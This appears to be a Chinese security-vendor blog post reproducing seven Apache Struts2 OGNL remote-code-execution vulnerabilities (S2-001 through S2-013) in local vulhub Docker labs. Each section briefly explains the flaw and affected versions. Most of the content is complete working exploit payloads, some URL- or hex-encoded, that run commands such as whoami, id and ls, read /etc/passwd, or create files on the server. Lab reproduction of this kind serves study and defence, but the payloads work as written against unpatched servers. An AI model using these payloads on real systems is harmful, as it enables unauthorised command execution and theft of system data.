Apache Struts2 是一个基于MVC设计模式的Web应用框架，会对某些标签属性（比如
id）的属性值进行二次表达式解析，因此在某些场景下将可能导致远程代码执行。

专注于漏洞攻防的华云安整理了堪称史上最全的Struts 2 漏洞复现，共17个。

今天和大家分享上部，请大家持续关注华云安。

##  **一、S2-001复现**

原理：该漏洞因用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式%{value}进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用%{value}对提交的数据执行了一次OGNL
表达式解析，所以可以直接构造 Payload进行命令执行。

影响版本：Struts 2.0.0 - 2.0.8

### 复现步骤

1\. 进入vulhub目录下漏洞环境的目录

命令：

    
    
    cd ../soft/vulhub-master/structs2/s2-001

![v2-3112b1f39b41eb6f0184aeb43e8738e1_720w.jpg](https://image.3001.net/images/20200814/1597395295.jpg!small)![v2-d4506c672767b1a9b2dae9b51bb19f73_720w.png](https://image.3001.net/images/20200814/1597395296.png!small)

2.自动编译化环境

命令：

    
    
    docker-compose build

![v2-58ad671f18fa0b57a40751b7533f6687_720w.jpg](https://image.3001.net/images/20200814/1597395297.jpg!small)

3.启动整个编译环境

    
    
    docker-compose up -d

![v2-bfed452736a4e9724dadff7229c62777_720w.png](https://image.3001.net/images/20200814/1597395297.png!small)

4.查看是否启动成功

docker ps(正在运行的环境)

![v2-332b6e442b949b68cc2338ed7bc1b070_720w.png](https://image.3001.net/images/20200814/1597395297.png!small)

5.然后访问靶机IP192.168.100.244:8080

![v2-c953c455e670249d6f4451678601e724_720w.jpg](https://image.3001.net/images/20200814/1597395298.jpg!small)

6\. 先来测试一下是否真的存在远程代码执行

![preview](https://image.3001.net/images/20200817/1597645969.jpg!small)返回了参数值说明漏洞存在

![v2-2f3938b2182a541b43abb189b6fd9030_720w.jpg](https://image.3001.net/images/20200814/1597395299.jpg!small)

7.构造poc，填到password框

    
    
    Poc：%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}

![preview](https://image.3001.net/images/20200817/1597645970.jpg!small)

语句被执行，查看返回的语句是/user/local/tomcat，即tomcat的执行语句

![v2-ce68be60e4ea0ec191f5c4ae032ebf39_720w.jpg](https://image.3001.net/images/20200814/1597395300.jpg!small)

8.构造获取web路径poc：

    
    
    Poc：%{
    
    #req=@org.apache.struts2.ServletActionContext@getRequest(),
    
    #response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),
    
    #response.println(#req.getRealPath('/')),
    
    #response.flush(),
    
    #response.close()
    
    }

![v2-2498085c2cc7004be1e2e6fe9f3dbfff_720w.jpg](https://image.3001.net/images/20200814/1597395301.jpg!small)

可见返回了web路径,为/usr/local/tomcat/webapps/ROOT

![preview](https://image.3001.net/images/20200818/1597743542.jpg!small)

9.构造查看权限的poc：

    
    
    Poc：
    
    %{
    
    #a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),
    
    #b=#a.getInputStream(),
    
    #c=new java.io.InputStreamReader(#b),
    
    #d=new java.io.BufferedReader(#c),
    
    #e=new char[50000],
    
    #d.read(#e),
    
    #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
    
    #f.getWriter().println(new java.lang.String(#e)),
    
    #f.getWriter().flush(),#f.getWriter().close()
    
    }

![v2-45b1ef7a0e206d29902b07f4333ceee6_720w.jpg](https://image.3001.net/images/20200814/1597395301.jpg!small)

返回的是root

![v2-725124bdc2ae56a5c83d818aac30b5e5_720w.jpg](https://image.3001.net/images/20200814/1597395302.jpg!small)

10\. 执行任意命令时只需要，将上面poc里whoami的命令替换

    
    
    %{
    
    #a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),
    
    #b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),
    
    #d=new java.io.BufferedReader(#c),
    
    #e=new char[50000],#d.read(#e),
    
    #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
    
    #f.getWriter().println(new java.lang.String(#e)),
    
    #f.getWriter().flush(),
    
    #f.getWriter().close()
    
    }

![preview](https://image.3001.net/images/20200817/1597645970.jpg!small)![v2-fce96f31f396a17ebaeda85ddd2280a3_720w.jpg](https://image.3001.net/images/20200814/1597395303.jpg!small)

11\. 关闭docker环境

命令：

    
    
    docker-compose down -v

![v2-39a91d63914dbb952aceb5beaa4b58da_720w.png](https://image.3001.net/images/20200814/1597395303.png!small)

##  **二、S2-005复现**

原理：s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts
2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开

影响版本：Struts 2.0.0-2.1.8.1

### 复现步骤

1.进入到005的环境目录下并启动环境

命令：

    
    
    docker-compose up -d

![v2-324fdadc0c34b9472844df70484de157_720w.png](https://image.3001.net/images/20200814/1597395304.png!small)

2.访问靶机：[http://192.168.100.244:8080/](https://link.zhihu.com/?target=http%3A//192.168.100.244%3A8080/)

![v2-16378567ee25c0cafff26c72f375c3d8_720w.jpg](https://image.3001.net/images/20200814/1597395304.jpg!small)

3.构造poc发送数据包，使用抓包工具burp suite，修改数据包插入poc

    
    
    Poc1：
    
    (%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1

![preview](https://image.3001.net/images/20200817/1597645971.jpg!small)![preview](https://image.3001.net/images/20200817/1597645972.jpg!small)

    
    
    Poc2：
    
    ?%27%2B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29%2B%27

![v2-9d4833b353b0b2457efbe07153a867f8_720w.jpg](https://image.3001.net/images/20200814/1597395306.jpg!small)

4.查看数据连接状态

![v2-107d9cd9fd97c19c2e3fbd8e034785cf_720w.png](https://image.3001.net/images/20200814/1597395306.png!small)

命令：docker exec -it ea8f121978e0 /bin/bash

ls /tmp

![v2-d0e341dd56d30264bf19fb9f95cbcde1_720w.png](https://image.3001.net/images/20200814/1597395307.png!small)

##  **三、S2-007复现**

原理：age来自于用户输入，传递一个非整数给id导致错误，struts会将用户的输入当作ongl表达式执行，从而导致了漏洞

影响版本：Struts 2.0.0 - 2.2.3

### 复现步骤：

1.进入到007的环境目录下并启动环境

命令：

    
    
    cd ../s2-007

命令：

    
    
    docker-compose up -d

![preview](https://image.3001.net/images/20200819/1597831001.jpg!small)2.访问靶机：[http://192.168.100.244:8080/](https://link.zhihu.com/?target=http%3A//192.168.100.244%3A8080/)

![v2-8fa198238f8d50cde81c8732f3f9c2da_720w.jpg](https://image.3001.net/images/20200814/1597395308.jpg!small)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

    
    
    %27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%20/%27%29.getInputStream%28%29%29%29+%2B+%27

![preview](https://image.3001.net/images/20200817/1597645972.jpg!small)

    
    
    Poc2：
    
    ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())) + '

![preview](https://image.3001.net/images/20200817/1597645973.jpg!small)![v2-1ae9e80ea1c5bead17f09e3e18c71430_720w.jpg](https://image.3001.net/images/20200814/1597395309.jpg!small)

![preview](https://image.3001.net/images/20200817/1597645974.jpg!small)查看日志

命令：docker ps 找到对应id

![v2-709666ee1ef4e4778c05c55ad620b4d6_720w.png](https://image.3001.net/images/20200814/1597395309.png!small)

命令：

    
    
    docker exec -it fb40896f2b09 /bin/bash

cd logs

![v2-5e409c994f7a93f938d14e0571de532d_720w.png](https://image.3001.net/images/20200814/1597395310.png!small)![v2-bca6d218fb54d2696145c86a17a7f6d8_720w.jpg](https://image.3001.net/images/20200814/1597395310.jpg!small)

命令：

    
    
    cat localhost_access_log.2020-07-13.txt

日志显示访问成功

![v2-62467750e10e12fcb63a2b14637e4445_720w.jpg](https://image.3001.net/images/20200814/1597395310.jpg!small)

##  **四、S2-008复现**

原理：S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie
名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode
模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但是这种情况在生产环境中几乎不可能存在，所以还是很鸡肋。

影响版本：Struts 2.1.0 – 2.3.1

### 复现步骤：

1.进入到008的环境目录下并启动环境

命令：

    
    
    cd ../s2-008

命令：

    
    
    docker-compose up -d

![v2-892bd6e83d83e1e3d99000ff887340c9_720w.png](https://image.3001.net/images/20200814/1597395311.png!small)

2.访问靶机：[http://192.168.100.244:8080/](https://link.zhihu.com/?target=http%3A//192.168.100.244%3A8080/)

![v2-d055efebfcbed5453d05f74f4ff90871_720w.jpg](https://image.3001.net/images/20200814/1597395311.jpg!small)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

    
    
    Poc：
    
    devmode.action?debug=command&expression=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=id

![v2-f9f27a4f1ebd039c6facec3392c012f2_720w.png](https://image.3001.net/images/20200814/1597395311.png!small)![v2-99053ac2db3eaa4792c849335d388f69_720w.jpg](https://image.3001.net/images/20200814/1597395312.jpg!small)

##  **五、S2-009复现**

原理：OGNL提供了广泛的表达式评估功能等功能。该漏洞允许恶意用户绕过ParametersInterceptor内置的所有保护（正则表达式，拒绝方法调用），从而能够将任何暴露的字符串变量中的恶意表达式注入进行进一步评估。ParametersInterceptor中的正则表达式将top
['foo']（0）作为有效的表达式匹配，OGNL将其作为（top
['foo']）（0）处理，并将“foo”操作参数的值作为OGNL表达式求值。这使得恶意用户将任意的OGNL语句放入由操作公开的任何String变量中，并将其评估为OGNL表达式，并且由于OGNL语句在HTTP参数中，攻击者可以使用黑名单字符（例如＃）禁用方法执行并执行任意方法，绕过ParametersInterceptor和OGNL库保护。

影响版本：Struts 2.1.0 - 2.3.1.1

### 复现步骤：

1.进入到009的环境目录下并启动环境

命令：

    
    
    cd ../s2-009

命令：

    
    
    docker-compose up -d

![preview](https://image.3001.net/images/20200818/1597743542.jpg!small)2.访问靶机：[http://192.168.100.244:8080/](https://link.zhihu.com/?target=http%3A//192.168.100.244%3A8080/)

![preview](https://image.3001.net/images/20200817/1597645975.jpg!small)3.构造poc，使用抓包工具burp
suite，修改数据包插入poc

    
    
    Poc1：
    
    /ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]

![preview](https://image.3001.net/images/20200818/1597743543.jpg!small)![preview](https://image.3001.net/images/20200817/1597645976.jpg!small)

    
    
    Poc2：
    
    POST /ajax/example5 HTTP/1.1
    
    Accept: */*
    
    Connection: keep-alive
    
    Content-Type: application/x-www-form-urlencoded
    
    Content-Length: 425
    
    Host: ********************
    
    z[%28name%29%28%27meh%27%29]&age=12313&name=(#context["xwork.MethodAccessor.denyMethodExecution"]=false,#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#s=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#s.println(#d),#s.close())(meh)

![preview](https://image.3001.net/images/20200817/1597645977.jpg!small)

##  **六、S2-012复现**

原理：如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，UserAction
中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name
参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。

影响版本：Struts 2.1.0-2.3.13

### 复现步骤：

1.进入到012的环境目录下并启动环境

命令：

    
    
    cd ../s2-012

命令：

    
    
    docker-compose up -d

![v2-5c3a443b4fa0378220305ba21bb2b5f6_720w.jpg](https://image.3001.net/images/20200814/1597395313.jpg!small)

2.访问靶机[http://192.168.100.244:8080](https://link.zhihu.com/?target=http%3A//192.168.100.244%3A8080)

![v2-3a5ea61b9dd28a9285399ac59bd4fd33_720w.jpg](https://image.3001.net/images/20200814/1597395314.jpg!small)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

    
    
    Poc1：
    
    %25%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%22%2f%62%69%6e%2f%62%61%73%68%22%2c%22%2d%63%22%2c%20%22%6c%73%22%7d%29%29%2e%72%65%64%69%72%65%63%74%45%72%72%6f%72%53%74%72%65%61%6d%28%74%72%75%65%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%66%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%22%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%22%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%23%65%29%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d

![v2-ecfd04c3969b5a8fc4b9a8f286db68f8_720w.jpg](https://image.3001.net/images/20200814/1597395314.jpg!small)

    
    
    Poc2：
    
    原始poc：
    
    %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash","-c", "ls})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}

注：利用此漏洞需要进行url编码

    
    
    %25%7B#a=(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B%22cat%22,%20%22/etc/passwd%22%7D)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new%20java.io.InputStreamReader(#b),#d=new%20java.io.BufferedReader(#c),#e=new%20char%5B50000%5D,#d.read(#e),#f=#context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22),#f.getWriter().println(new%20java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()%7D

![preview](https://image.3001.net/images/20200818/1597743544.jpg!small)

##  **七、S2-013复现**

原理：struts2的标签中 和 都有一个 includeParams 属性，可以设置成如下值

  * none - URL中不包含任何参数（默认）
  * get - 仅包含URL中的GET参数
  * all - 在URL中包含GET和POST参数

此时 或尝试去解析原始请求参数时，会导致OGNL表达式的执行

影响版本：Struts 2.0.0-2.3.14

### 复现步骤：

1.进入到013的环境目录下并启动环境

命令：

    
    
    cd ../s2-013

命令：

    
    
    docker-compose up -d

![preview](https://image.3001.net/images/20200817/1597645978.jpg!small)2\.
访问靶机[http://192.168.100.244:8080](https://link.zhihu.com/?target=http%3A//192.168.100.244%3A8080)

![v2-ac68afb36e4b85787fa0ed68940b5a72_720w.jpg](https://image.3001.net/images/20200814/1597395315.jpg!small)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

    
    
    Poc：
    
    a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('id').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D

![v2-1a2ad863dedd069022ece6e647424f12_720w.png](https://image.3001.net/images/20200814/1597395316.png!small)![v2-1523c99828b3eb43ab08369846582342_720w.jpg](https://image.3001.net/images/20200814/1597395316.jpg!small)![v2-f458b8b3da677518c231f455e9293427_720w.jpg](https://image.3001.net/images/20200814/1597395317.jpg!small)

